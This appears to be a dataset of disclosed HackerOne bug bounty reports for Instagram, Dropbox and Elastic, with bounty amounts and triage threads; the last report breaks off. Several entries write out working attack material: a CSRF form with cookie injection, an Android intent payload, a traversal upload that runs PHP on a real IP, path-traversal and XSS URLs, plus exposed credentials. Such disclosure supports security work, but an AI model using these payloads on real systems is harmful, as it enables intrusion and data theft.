http://blackfan.ru/facebookbugbounty/nouysqaqfbskgobuqkknoitvyqmjgony_instagram.html
Source:
Code 575 BytesWrap lines Copy Download1<form 
2action=""http://instagram.com/web/friendships/1312928755/follow/?ref=emptyfeed"" 
3id=""csrf"" 
4method=""POST"">
5      <input type=""hidden"" name=""csrfmiddlewaretoken"" value=""x"" />
6      <input type=""submit"" value=""Submit request"" />
7</form>
8
9<script>
10      function xxx() {
11        document.getElementById('csrf').submit();
12      }
13</script>
14
15<iframe 
16onload=""xxx()"" 
17src=""http://blackfan.ru/r/,]csrftoken=x,;domain=.instagram.com;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;?r=http://blog.instagram.com/""/>
Description:


A user authenticates on instagram.com


We make him visit the link below assuming that he has not visited blog.instagram.com and he doesn't have utmz set on this subdomain:
http://blackfan.ru/r/,]csrftoken=x,;domain=.instagram.com;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;?r=http://blog.instagram.com/
Cookie is rewritten with new path and domain, as a result cookie is set for .instagram.com:
utmz=90378079.1401435337.1.1.utmcsr=blackfan.ru|utmccn=(referral)|utmcmd=referral|utmcct=/r/,]csrftoken=x,


At this moment request to the web server will make it believe that cookie __utmz consists of incorrect cookie and CSRF token equals to ""x""


Submit follow form using CSRF-token ""x""",https://hackerone.com/reports/26647,New York,United States,New York,2014,9,1,8,28
Dropbox,1001-5000,0.0,200m-1b,"$1,000.00",Low,2.0,Privilege Escalation,Android - Access of some not exported content providers ,"bagipro  submitted a report to Dropbox.Sep 26th (5 years ago)Summary by bagiproI used the following payload
Code 712 Bytes1        Intent next = new Intent();
2        next.setClassName(getPackageName(), ""com.dropbox.android.activity.CameraUploadSettingsActivity"");
3        next.setData(Uri.parse(""content://com.dropbox.android.LocalFile/smth""));
4        next.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION
5                | Intent.FLAG_GRANT_WRITE_URI_PERMISSION
6                | Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION
7                | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION);
8
9        Intent intent = new Intent();
10        intent.setClassName(""com.dropbox.android"", ""com.dropbox.android.activity.LoginOrNewAcctActivity"");
11        intent.putExtra(""com.dropbox.activity.extra.NEXT_INTENT"", next);
12        startActivity(intent);
and way able to get access to providers which are android:exported=""false"" but android:grantUriPermissions=""true"" of Dropbox app. App had a white-list of allowed activities and performed the check by the following way:
Code 382 Bytes1    public static boolean a(Intent intent) {
2        ComponentName component = intent.getComponent();
3        if (component == null) {
4            return false;
5        }
6        String className = component.getClassName();
7        for (Object equals : F) {
8            if (className.equals(equals)) {
9                return true;
10            }
11        }
12        return false;
13    }
So I created an activity inside my app with name com.dropbox.android.activity.CameraUploadSettingsActivity and was able to force Dropbox app open it.",https://hackerone.com/reports/272044,California,United States,San Francisco,2017,9,26,15,51
Dropbox,1001-5000,0.0,200m-1b,$512.00,No value,0.0,Improper Authentication - Generic,Broken OAuth leads to change photo profile users .,u0pattern  submitted a report to Dropbox.Jul 13th (3 years ago),https://hackerone.com/reports/642475,California,United States,San Francisco,2019,7,13,14,25
Dropbox,1001-5000,0.0,200m-1b,$216.00,No value,0.0,None,Dropbox employee benefits documents are available in a test Dropbox folder,phwd  submitted a report to Dropbox.Oct 17th (5 years ago)devd   changed the status to Triaged. Oct 17th (5 years ago)Dropbox  rewarded phwd with a $216 bounty. Oct 17th (5 years ago)devd   closed the report and changed the status to Resolved. Oct 17th (5 years ago)Dropbox  rewarded phwd with a $343 bounty. Apr 14th (5 years ago)phwd   requested to disclose this report. Sep 17th (4 years ago)nlattimer   agreed to disclose this report. Sep 17th (4 years ago)  This report has been disclosed. Sep 17th (4 years ago),https://hackerone.com/reports/278182,California,United States,San Francisco,2017,10,17,12,8
Dropbox,1001-5000,0.0,200m-1b,$343.00,No value,0.0,Cross-site Scripting (XSS) - Stored,Dropbox Paper - Markdown XSS,"tuckercarlson  submitted a report to Dropbox.Apr 25th (6 years ago)Hello,
Today I took a look at Dropbox Paper and noticed there is an option to export/download the project as a Markdown or word (docx) document. I noticed it doesn't filter any kind of Markdown escaping, meaning when parsed after download will let us execute client side code. (equivallent to arbritary file read or code execution if executed from file:/// or local scheme)
I think the markdown download should sanitize against these payloads that can generate these security holes. sample paylaod I used was:
[Here is the demo link we provided you](javascript:doevil(readfileandsenddata))
I attached a sample .md file I just downloaded from dropbox.
Thanks,
Paulos2 attachments:F179498: sample.mdF179499: sample2.md",https://hackerone.com/reports/223906,California,United States,San Francisco,2017,4,25,21,32
Dropbox,1001-5000,0.0,200m-1b,"$1,024.00",Low,2.0,Information Disclosure,Exposed Git Repo at http://fileserver.dropboxbusiness.com,todayisnew  submitted a report to Dropbox.Feb 17th (5 years ago),https://hackerone.com/reports/317119,California,United States,San Francisco,2018,2,17,13,57
Dropbox,1001-5000,0.0,200m-1b,$216.00,No value,0.0,None,Race condition when redeeming coupon codes,"franjkovic  submitted a report to Dropbox.May 1st (8 years ago)Hello,
there is a race condition when redeeming coupon codes in https://www.dropbox.com/coupons. Basically, it enables me to reuse one coupon code many times.
Here are the steps to reproduce:

Get a coupon code. I bought mine on fiverr.
Go to https://www.dropbox.com/coupons and enter your code
Click submit; a POST request will be made to /coupons - intercept it
Repeat that request many times in short time frame. 
Hopefully, promo code will be added multiple times to your account.

I have attached a screenshot of my accounts page with one code redeemed multiple times.
Best regards,
Josip1 attachment:F36528: dropbox-coupons.png",https://hackerone.com/reports/59179,California,United States,San Francisco,2015,5,1,6,4
Dropbox,1001-5000,0.0,200m-1b,"$4,913.00",High,7.95,Server-Side Request Forgery (SSRF),Server Side Request Forgery (SSRF) at app.hellosign.com leads to AWS private keys disclosure,"sayaanalam  submitted a report to Dropbox.Jul 14th (2 years ago)Summary by sayaanalamCheck out the write-up published at https://medium.com/techfenix/ssrf-server-side-request-forgery-worth-4913-my-highest-bounty-ever-7d733bb368cb
Dropbox Team have been too helpful throughout the process.
You can connect with me on Twitter",https://hackerone.com/reports/923132,California,United States,San Francisco,2020,7,14,9,47
Elastic,1001-5000,0.0,1m-10m,"$3,800.00",High,7.95,Improper Access Control - Generic,Improper authorization on `/api/as/v1/credentials/` for  Dev Role User with Limited Engine Access,"superman85  submitted a report to Elastic.Jun 6th (about 1 year ago)Summary:
Dear Team,
Since  #1168528 was resolved. I have checking again for other roles. At Dev Role with Limited Engine Access, an user still can access API endpoint
/api/as/v1/credentials/ to get all API keys (private-key, search-key ... )
Steps To Reproduce:
1 - Log in Kibana with the admin (elastic) user and go to the Stack Management > Users page (/app/management/security/users/)
2 - Choose an username , password and role for this user. For example you can choose username: dev
3 - Log in App Search with the admin (elastic) user and go to the Users & roles page (/as#/role-mappings/)
4 - Click Add mapping
5 - External Attribute choose username , in the Attribute value field enter dev
6 - In the Role box select Dev
7 - In Engine Access select Limited Engine Access, no need to select any engine
8 - Login to App Search with user dev
9 - Go to endpoint https://your_app_search_instance/api/as/v1/credentials/
10 - You still can get all api keys 
I have attached video PoC
█████████
Impact
Privilege escalation. The default App Search install has a Private API Key with read/write access to all engines. If a Private Admin Key has been created before. the attacker can use it to create new API keys or delete existing ones.
With Limited Engine Acess, an user should create and managed their own api keys",https://hackerone.com/reports/1218680,California,United States,Mountain View,2021,6,6,19,56
Elastic,1001-5000,0.0,1m-10m,"$2,000.00",Critical,9.8,Cleartext Storage of Sensitive Information,Critical || Unrestricted access to private Github repos and properties of Elastic through leaked token of Elastic employee,prateek_0490  submitted a report to Elastic.Jul 16th (about 1 year ago),https://hackerone.com/reports/1266188,California,United States,Mountain View,2021,7,16,16,48
Elastic,1001-5000,0.0,1m-10m,"$1,760.00",Critical,9.8,Code Injection,CVE-2021-40870 on [52.204.160.31],"fdeleite  submitted a report to Elastic.Oct 1st (about 1 year ago)An issue was discovered in Aviatrix Controller 6.x before 6.5-1804.1922. Unrestricted upload of a file with a dangerous type is possible, which allows an unauthenticated user to execute arbitrary code via directory traversal.
The IP has a SSL certificate pointing to ElasticSearch.
curl -kv https://52.204.160.31
Output
Code 111 BytesWrap lines Copy Download1 Server certificate:
2*  subject: C=US; ST=California; L=Mountain View; O=Elasticsearch, Inc.; CN=*.elasticit.co
Steps To Reproduce
First, run this request:
Code 414 BytesWrap lines Copy Download1POST /v1/backend1 HTTP/1.1
2Host: 52.204.160.31
3User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
4Connection: close
5Content-Length: 136
6Content-Type: application/x-www-form-urlencoded
7Accept-Encoding: gzip
8
9CID=x&action=set_metric_gw_selections&account_name=/../../../var/www/php/1yv4QQmkj4h4OdmmyT11tkiGf5M.php&data=RCE<?php phpinfo()?>
10
The retrieve the content from file 1yv4QQmkj4h4OdmmyT11tkiGf5M.php
Code 270 BytesWrap lines Copy Download1GET /v1/1yv4QQmkj4h4OdmmyT11tkiGf5M.php HTTP/1.1
2Host: 52.204.160.31
3User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36
4Connection: close
5Content-Type: application/x-www-form-urlencoded
6Accept-Encoding: gzip
Which is basically the output of the phpinfo function:
Response (truncated): 
Code 3.10 KiBWrap lines Copy Download1tr class=""h""><th>Variable</th><th>Value</th></tr>
2<tr><td class=""e"">SCRIPT_URL </td><td class=""v"">/v1/1yv4QQmkj4h4OdmmyT11tkiGf5M.php </td></tr>
3<tr><td class=""e"">SCRIPT_URI </td><td class=""v"">https://52.204.160.31:8443/v1/1yv4QQmkj4h4OdmmyT11tkiGf5M.php </td></tr>
4<tr><td class=""e"">HTTPS </td><td class=""v"">on </td></tr>
5<tr><td class=""e"">SSL_SERVER_S_DN_C </td><td class=""v"">US </td></tr>
6<tr><td class=""e"">SSL_SERVER_S_DN_ST </td><td class=""v"">California </td></tr>
7<tr><td class=""e"">SSL_SERVER_S_DN_L </td><td class=""v"">Mountain View </td></tr>
8<tr><td class=""e"">SSL_SERVER_S_DN_O </td><td class=""v"">Elasticsearch, Inc. </td></tr>
9<tr><td class=""e"">SSL_SERVER_S_DN_CN </td><td class=""v"">*.elasticit.co </td></tr>
10<tr><td class=""e"">SSL_SERVER_I_DN_C </td><td class=""v"">US </td></tr>
11<tr><td class=""e"">SSL_SERVER_I_DN_O </td><td class=""v"">DigiCert Inc </td></tr>
12<tr><td class=""e"">SSL_SERVER_I_DN_CN </td><td class=""v"">DigiCert SHA2 Secure Server CA </td></tr>
13<tr><td class=""e"">SSL_SERVER_SAN_DNS_0 </td><td class=""v"">*.elasticit.co </td></tr>
14<tr><td class=""e"">SSL_SERVER_SAN_DNS_1 </td><td class=""v"">elasticit.co </td></tr>
15<tr><td class=""e"">SSL_VERSION_INTERFACE </td><td class=""v"">mod_ssl/2.4.39 </td></tr>
16<tr><td class=""e"">SSL_VERSION_LIBRARY </td><td class=""v"">OpenSSL/1.1.1b </td></tr>
17<tr><td class=""e"">SSL_PROTOCOL </td><td class=""v"">TLSv1.2 </td></tr>
18<tr><td class=""e"">SSL_SECURE_RENEG </td><td class=""v"">true </td></tr>
19<tr><td class=""e"">SSL_COMPRESS_METHOD </td><td class=""v"">NULL </td></tr>
20<tr><td class=""e"">SSL_CIPHER </td><td class=""v"">ECDHE-RSA-AES128-GCM-SHA256 </td></tr>
21<tr><td class=""e"">SSL_CIPHER_EXPORT </td><td class=""v"">false </td></tr>
22<tr><td class=""e"">SSL_CIPHER_USEKEYSIZE </td><td class=""v"">128 </td></tr>
23<tr><td class=""e"">SSL_CIPHER_ALGKEYSIZE </td><td class=""v"">128 </td></tr>
24<tr><td class=""e"">SSL_CLIENT_VERIFY </td><td class=""v"">NONE </td></tr>
25<tr><td class=""e"">SSL_SERVER_M_VERSION </td><td class=""v"">3 </td></tr>
26<tr><td class=""e"">SSL_SERVER_M_SERIAL </td><td class=""v"">093CE89EF93EE5F18D1E07099ACC5AF9 </td></tr>
27<tr><td class=""e"">SSL_SERVER_V_START </td><td class=""v"">Mar 20 00:00:00 2020 GMT </td></tr>
28<tr><td class=""e"">SSL_SERVER_V_END </td><td class=""v"">Mar 25 12:00:00 2022 GMT </td></tr>
29<tr><td class=""e"">SSL_SERVER_S_DN </td><td class=""v"">CN=*.elasticit.co,O=Elasticsearch\, Inc.,L=Mountain View,ST=California,C=US </td></tr>
30<tr><td class=""e"">SSL_SERVER_I_DN </td><td class=""v"">CN=DigiCert SHA2 Secure Server CA,O=DigiCert Inc,C=US </td></tr>
31<tr><td class=""e"">SSL_SERVER_A_KEY </td><td class=""v"">rsaEncryption </td></tr>
32<tr><td class=""e"">SSL_SERVER_A_SIG </td><td class=""v"">sha256WithRSAEncryption </td></tr>
33<tr><td class=""e"">SSL_SESSION_ID </td><td class=""v"">9cf6b4b42df9e371982120b49d57f9112c19df3722fb87d15cc592f73e1fa406 </td></tr>
34<tr><td class=""e"">SSL_SESSION_RESUMED </td><td class=""v"">Initial </td></tr>
35<tr><td class=""e"">HTTP_HOST </td><td class=""v"">52.204.160.31 </td></tr>
36<tr><td class=""e"">HTTP_USER_AGENT </td><td class=""v"">Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36 </td></tr>
37<tr><td class=""e"">HTTP_CONNECTION </td><td class=""v"">close </td></tr>
Impact

An unauthenticated, 3rd-party attacker or adversary can execute remote code

Supporting Material/References
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-40870haxor31337   filed a duplicate (#1357601) and was invited to participate in this report. Oct 5th (about 1 year ago)h1_analyst_layla HackerOne triage  changed the status to Triaged. Oct 5th (about 1 year ago)Hello @fdeleite,
Thank you for your submission! We were able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.
Thanks,
@bassguitarh1_analyst_layla HackerOne triage  updated the severity from critical to critical (10.0). Oct 5th (about 1 year ago)douglas_day Elastic staff  posted a comment. Oct 5th (about 1 year ago)Nice one @fdeleite - I""m investigating internally and should have an update for you in the next couple of daysdouglas_day Elastic staff  updated the severity from critical (10.0) to critical (9.8). Oct 5th (about 1 year ago)fdeleite   posted a comment. Oct 5th (about 1 year ago)Thank you @douglas_day Elastic  rewarded fdeleite with a $1,760 bounty. Oct 5th (about 1 year ago)Hey @fdeleite ,
I believe this is now fixed - can you confirm?fdeleite   posted a comment. Oct 5th (about 1 year ago)Hello there,
It's fixed, while trying to run the GET request I get a ""404 Not Found"" error. 
Thanks for such a quick resolution! douglas_day Elastic staff  closed the report and changed the status to Resolved. Oct 6th (about 1 year ago)Thanks @fdeleite !fdeleite   requested to disclose this report. Oct 6th (about 1 year ago)Thank you @douglas_day!douglas_day Elastic staff  agreed to disclose this report. Oct 6th (about 1 year ago)  This report has been disclosed. Oct 6th (about 1 year ago)",https://hackerone.com/reports/1356845,California,United States,Mountain View,2021,10,1,20,20
Elastic,1001-5000,0.0,1m-10m,$570.00,Low,3.1,Path Traversal,Fix for CVE-2021-22151 (Kibana path traversal issue) can be bypassed on Windows,"dee-see  submitted a report to Elastic.Sep 28th (about 1 year ago)Summary
Hello team, I hope you're doing well! I was combing through your GitHub repository to look at the fixes for recent security releases and found the fix for CVE-2021-22151 to be incomplete. The current fix makes assumptions that are true on Linux but that don't hold on Windows.
Details
The fixed code looks like this
Code 359 BytesWrap lines Copy Download1      const range = path.normalize(request.params.range);
2      return range.startsWith('..')
3        ? response.notFound()
4        : new Promise((resolve) => {
5            const fontPath = path.join(__dirname, 'fonts', 'open_sans', `${range}.pbf`);
6            fs.readFile(fontPath, (error, data) => {
7                // snipped
8            });
9          });
The assumption is that any path traversal attempts, once normalized, will start with ... This seems to hold on Linux, however on Windows this can happen (using the NodeJS REPL for demonstration here):
Code 304 BytesWrap lines Copy Download1> let range = path.normalize('c:../../../../../../../path_traversal')
2undefined
3> console.log(range)
4c:..\..\..\..\..\..\..\path_traversal
5> range.startsWith('..')
6false
7> const fontPath = path.join(__dirname, 'fonts', 'open_sans', `${range}.pbf`);
8undefined
9> console.log(fontPath)
10c:\path_traversal.pbf
Path traversal happened even if the range didn't start with ...
Steps to reproduce
This requires Kibana to be installed on Windows.

Put a .pbf file somewhere on disk for demonstration. I did it with echo hax > c:\path_traversal.pbf
Visit http://localhost:5601/api/maps/fonts/open_sans/c%3A..%2F..%2F..%2F..%2F..%2F..%2F..%2Fpath_traversal and the file from the previous step will be downloaded

You might need to add some ..%2f depending on how deep Kibana is installed.



Remediation
Thom Heymann already had a great suggestion in their code review

The best way to solve this is to resolve the path from range and ensure it is inside your fonts directory.

I think this would fix the issue once and for all!
Impact
Path traversal disclosing .pbf files
    
    
        
            
                
                
                
            
        
    
dee-see   posted a comment. Sep 29th (about 1 year ago)Here's a video demonstration Video F1465409: 2021-09-29_08-28-24.mp4 2.07 MiBZoom in Zoom out Copy Download1 attachment:F1465409: 2021-09-29_08-28-24.mp4
    
    
        
            
                
                
                
            
        
    
dee-see   posted a comment. Sep 29th (about 1 year ago)And here's a publicly hosted Kibana instance for your easy repro:

Go to http://ec2-3-98-130-0.ca-central-1.compute.amazonaws.com:5601/
Login with username h1repro and password LT5NFGoR
Go to http://ec2-3-98-130-0.ca-central-1.compute.amazonaws.com:5601/api/maps/fonts/open_sans/c%3A..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fpath_traversal
Observe the file you downloaded which is the one shown in the video
h1_analyst_amey HackerOne triage  posted a comment. Oct 1st (about 1 year ago)Hi @dee-see,
Thank you for your submission. I hope you are well. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.
Have a great day! 
Kind regards,
@forest_dwellerh1_analyst_amey HackerOne triage  changed the status to Triaged. Oct 7th (about 1 year ago)Hello @dee-see,
Apologies for the delay caused in validating this report!
I was able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.
All the best for your next find! Look forward to your next awesome bug report!
Cheers,
@forest_dwellerdouglas_day Elastic staff  changed the scope from https://github.com/elastic/kibana to All Elastic Products. Oct 7th (about 1 year ago)douglas_day Elastic staff  updated the severity from low (3.1) to low (3.0). Oct 7th (about 1 year ago)Elastic  rewarded dee-see with a $570 bounty. Oct 7th (about 1 year ago)Updated the previous issue.
Thanks for the catch @dee-see !douglas_day Elastic staff  updated the severity from low (3.0) to low (3.1). Oct 7th (about 1 year ago)Elastic  rewarded dee-see with a $14 bounty. Oct 7th (about 1 year ago)Mistake in CVSS calculation - awarding the differencedouglas_day Elastic staff  closed the report and changed the status to Resolved. Nov 15th (about 1 year ago)douglas_day Elastic staff  requested to disclose this report. Nov 15th (about 1 year ago)dee-see   agreed to disclose this report. Nov 15th (about 1 year ago)  This report has been disclosed. Nov 15th (about 1 year ago)",https://hackerone.com/reports/1353603,California,United States,Mountain View,2021,9,28,12,50
Elastic,1001-5000,0.0,1m-10m,"$3,000.00",High,8.0,Cross-site Scripting (XSS) - Stored,[Swiftype] - Stored XSS via document field `url` triggers on `https://app.swiftype.com/engines/<engine>/document_types/<type>/documents/<id>`,"superman85  submitted a report to Elastic.Jun 27th (about 1 year ago)Dear Team,
I have found a stored XSS when create a document via API-based engine. The XSS payload stored in url field.
To understand about document schema for API-based engine, please go to https://swiftype.com/documentation/site-search/guides/schema-design#api-based
After indexed a document with XSS payload stored in url field. When view the document details, click on link View on your site the XSS will triggered.
Step to reproduce
1 - Create a trial account on https://app.swiftype.com/ my admin account email is qwerty.chan8@gmail.com
2 - Create a API-based Engine by visit https://app.swiftype.com/engines/api , choose a Engine name and DocumentType Name and click Create Engine.For example in my case (Engine: 123, DocumentType: test)
Image F1355460: create_api_engine.png 115.56 KiBZoom in Zoom out Copy Download
3 - Go to https://app.swiftype.com/settings/account and obtain your API Key for example in my case: gB7BT3iA3GhqoU_SWoRq
Image F1355464: retrieve_api_key.png 131.91 KiBZoom in Zoom out Copy Download
4 - Call API to create a document follow curl command below, store XSS payload javascript:alert(1) in url and thumbnail_url field value
Code 1.27 KiBWrap lines Copy Download1curl -X POST 'https://api.swiftype.com/api/v1/engines/123/document_types/test/documents.json' \
2  -H 'Content-Type: application/json' \
3  -d '{
4        ""auth_token"": ""gB7BT3iA3GhqoU_SWoRq"",
5        ""document"": {
6          ""external_id"": ""v1uyQZNg2vE"",
7          ""fields"": [
8            {""name"": ""url"", ""value"": ""javascript:alert(1)"", ""type"":  ""enum""},
9            {""name"": ""thumbnail_url"", ""value"": ""javascript:alert(1)"", ""type"": ""enum""},
10            {""name"": ""channel_id"", ""value"": ""UCK8sQmJBp8GCxrOtXWBpyEA"", ""type"": ""enum""},
11            {""name"": ""title"", ""value"": ""How It Feels [through Glass]"", ""type"": ""string""},
12            {""name"": ""caption"", ""value"": ""Want to see how Glass actually feels?..."", ""type"": ""text""},
13            {""name"": ""tags"", ""value"": [""glass"", ""wearable computing"", ""google""], ""type"": ""string""},
14            {""name"": ""category_name"", ""value"": ""Science & Technology"", ""type"": ""string""},
15            {""name"": ""category_id"", ""value"": 28, ""type"": ""enum""},
16            {""name"": ""published_at"", ""value"": ""2013-02-20T10:47:18"", ""type"": ""date""},
17            {""name"": ""duration"", ""value"": 136, ""type"": ""integer""},
18            {""name"": ""view_count"", ""value"": 14599202, ""type"": ""integer""},
19            {""name"": ""like_count"", ""value"": 75952, ""type"": ""integer""}
20          ]
21        }
22     }'
5 - Go to Engine 123 and click on Manage -> Content or https://app.swiftype.com/engines/123/document_types/test/documents#q=&page=1
Image F1355463: document_list.png 131.97 KiBZoom in Zoom out Copy Download
6 - Click on document ID v1uyQZNg2vE you just created, you can see the document details
Image F1355462: document_details.png 133.32 KiBZoom in Zoom out Copy Download
7 - Click on the link http://javascript:alert(1) in document details
Image F1355461: click_link.png 137.42 KiBZoom in Zoom out Copy Download
Image F1355465: xss_fires.png 86.67 KiBZoom in Zoom out Copy Download
Impact
Steal other users sessions, trick users go to unwanted websites6 attachments:F1355460: create_api_engine.pngF1355461: click_link.pngF1355462: document_details.pngF1355463: document_list.pngF1355464: retrieve_api_key.pngF1355465: xss_fires.png
    
    
        
            
                
                
                
            
        
    
superman85   posted a comment. Jun 27th (about 1 year ago)To clarify impact of this report: An user with Editor role can create a document and store XSS payload in url field. When an Admin or Viewer user visit the url their sessions might be stolenh1_analyst_amey HackerOne triage  posted a comment. Jun 29th (about 1 year ago)Hi @superman85,
Thank you for your submission. I hope you are well. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.
Have a great day! 
Kind regards,
@forest_dwellerh1_analyst_amey HackerOne triage  updated the severity from high to medium (5.7). Jun 29th (about 1 year ago)h1_analyst_amey HackerOne triage  changed the report title from [Swiftype] - Stored XSS via document field `url` when create API-based engine's document to [Swiftype] - Stored XSS via document field `url` triggers on `https://app.swiftype.com/engines/<engine>/document_types/<type>/documents/<id>`. Jun 29th (about 1 year ago)h1_analyst_amey HackerOne triage  changed the status to Triaged. Jun 29th (about 1 year ago)Hello @superman85,
Thank you for yet another wonderful report!
I was able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.
Please note that I have adjusted the CVSS metrics for this issue to reflect the impact correctly.
Cheers,
@forest_dwellerdouglas_day Elastic staff  updated the severity from medium (5.7) to high (8.0). Jun 30th (about 1 year ago)Elastic  rewarded superman85 with a $3,000 bounty. Jun 30th (about 1 year ago)Thanks @superman85 !
    
    
        
            
                
                
                
            
        
    
superman85   posted a comment. Jun 30th (about 1 year ago)@douglas_day Thank you so much for the bounty!douglas_day Elastic staff  posted a comment. Jul 1st (about 1 year ago)Of course @superman85 !
Would you mind making another video for us, explaining your bug? :) You can leave out your introduction because you provided that in your last video
    
    
        
            
                
                
                
            
        
    
superman85   posted a comment. Jul 1st (about 1 year ago)@douglas_day I can make a video today when I came back home. 
    
    
        
            
                
                
                
            
        
    
superman85   posted a comment. Updated Aug 3rd (about 1 year ago)@douglas_day I have created second video explain my bugs. Please take a look! Sorry for my English and the sound device in my laptop is bad!
██████████
If you do not mind! Can you invite my friends to join Elastic bbp?
https://hackerone.com/duahaubadao?type=user
https://hackerone.com/haxor31337?type=user
Thank youElastic  rewarded superman85 with a $200 bonus. Jul 6th (about 1 year ago)Thanks @superman85 !
And yes, I will invite them today.douglas_day Elastic staff  posted a comment. Jul 6th (about 1 year ago)I just invited them :) 
Hope the three of you are able to find some awesome bugs!
    
    
        
            
                
                
                
            
        
    
superman85   posted a comment. Jul 6th (about 1 year ago)@douglas_day thank you so much for the bonus and the invitation!
    
    
        
            
                
                
                
            
        
    
superman85   posted a comment. Jul 6th (about 1 year ago)@douglas_day I am using free trial 14 days on app.swiftype.com? Can you give me an access to Pro/Premium plan for testing other features?
Thanks,douglas_day Elastic staff  posted a comment. Jul 8th (about 1 year ago)Hey @superman85 ,
I looked into this and what i can do is make your free trial unlimited, and if you want any specific Pro/Premium features, just tell me which features and I can look into enabling them for you.
    
    
        
            
                
                
                
            
        
    
superman85   posted a comment. Jul 9th (about 1 year ago)@douglas_day I read a link at https://swiftype.com/documentation/site-search/guides/multiple-domains and see a function is not exist in my trial account Interface Designer
Image F1370845: add-domain.png 107.99 KiBZoom in Zoom out Copy Download
Can you check and let me know! Thanks
I looked into this and what i can do is make your free trial unlimited
Can you make my account email: qwerty.chan8@gmail.com to unlimited? Thanks1 attachment:F1370845: add-domain.pngdouglas_day Elastic staff  closed the report and changed the status to Resolved. Jul 12th (about 1 year ago)This has been fixed.
    
    
        
            
                
                
                
            
        
    
superman85   posted a comment. Aug 3rd (about 1 year ago)Since the report was resolved. Lets disclose it. Thanks
    
    
        
            
                
                
                
            
        
    
superman85   requested to disclose this report. Aug 3rd (about 1 year ago)Please redact my video training before disclose :Ddouglas_day Elastic staff  agreed to disclose this report. Aug 3rd (about 1 year ago)I've made your video Internal Only - so only you and the Elastic team can view it.  This report has been disclosed. Aug 3rd (about 1 year ago)",https://hackerone.com/reports/1245787,California,United States,Mountain View,2021,6,27,17,12
Elastic,1001-5000,0.0,1m-10m,"$2,000.00",High,7.95,Cross-site Scripting (XSS) - DOM,Prototype Pollution leads to XSS on https://blog.swiftype.com/#__proto__[asd]=alert(document.domain),"s1r1u5  submitted a report to Elastic.Oct 5th (2 years ago)Summary:
deparam function which parses location.hash in https://s.swiftypecdn.com/install/v2/st.js  is vulnerable to prototype pollution.
There is a script gadget in the same js file which leads to XSS.
Steps To Reproduce:
Visit (Refresh if you don't see a pop up)
https://blog.swiftype.com/#__proto__[asd]=alert(document.domain)
Root Cause
https://s.swiftypecdn.com/install/v2/st.js is the vulnerable file.
deparam function parses the  location.hash incorrectly which leads to Prototype Pollution.
Code 1.17 KiBWrap lines Copy Download1
2 t.deparam = h = function(e, n) {
3            var i = {}
4              , r = {
5                ""true"": !0,
6                ""false"": !1,
7                ""null"": null
8            };
9            return t.each(e.replace(/\+/g, "" "").split(""&""), function(e, o) {
10                var s, a = o.split(""=""), u = b(a[0]), c = i, h = 0, p = u.split(""][""), f = p.length - 1;
11                if (/\[/.test(p[0]) && /\]$/.test(p[f]) ? (p[f] = p[f].replace(/\]$/, """"),
12                p = p.shift().split(""["").concat(p),
13                f = p.length - 1) : f = 0,
14                2 === a.length)
15                    if (s = b(a[1]),
16                    n && (s = s && !isNaN(s) ? +s : ""undefined"" === s ? l : r[s] !== l ? r[s] : s),
17                    f)
18                        for (; h <= f; h++)
19                            u = """" === p[h] ? c.length : p[h],
20                            c = c[u] = h < f ? c[u] || (p[h + 1] && isNaN(p[h + 1]) ? {} : []) : s; //pollution here
21                    else
22                        t.isArray(i[u]) ? i[u].push(s) : i[u] !== l ? i[u] = [i[u], s] : i[u] = s;
23                else
24                    u && (i[u] = n ? l : """")
25            }),
26            i
27        }
28
Gadget found in the same js, which is very interesting gadget I found so far :xD
Code 404 BytesWrap lines Copy Download1
2    
3        pInstall._convertStringHooksToFunctions = function() {
4            var functionHooks = {};
5            $.each(this._userServerConfiguration.install.hooks, function(hookName, hookFunction) {
6                functionHooks[hookName] = eval(hookFunction) //eval everything in the object
7            }),
8            this._userServerConfiguration.install.hooks = functionHooks
9        }
10        
11
Impact:
XSS
Impact
XSS",https://hackerone.com/reports/998398,California,United States,Mountain View,2020,10,5,13,36
Elastic,1001-5000,0.0,1m-10m,"$7,500.00",Critical,9.5,Privilege Escalation,RCE hazard in reporting (via Chromium),"alexbrasetvik  submitted a report to Elastic.Apr 19th (2 years ago)Summary: Reporting embeds a Chromium that is susceptible to RCEs
Description:
Reporting uses a headless Chromium to generate PNGs and PDFs. This is invoked (at least on Elastic Cloud, ECE and ECK) with --no-sandbox to work at all.
There are RCEs readily available for Chrome, and at least the versions shipped with 7.11 and 7.12 are susceptible to the attached example.
Attached is an adaptation of this exploit: https://github.com/rapid7/metasploit-framework/pull/15007/files#diff-42ae645fcacbd90d93296471ac57e1d734544af7fb082efd607db0a29d197ac4R53
I have not been able to devise a complete chain yet (thus the ""hazard""), but anything that enables pointing reporting at attacker-controlled JS would be able to pop an RCE this way. HTML-injection or XSS (even with the CSP a HTML injection will enable a redirect) or an open redirect would enable pointing reporting at custom JS code.
Steps To Reproduce:

Host the attached HTML somewhere, in my case it's available on http://192.168.0.154:8009/alexb-says-hi.html
Point the x-pack reporting-embedded Chromium at it (this step is missing to complete the chain)

Here's an example. The attached HTML file gets uname -a > /tmp/alexb-says-hi to be run:
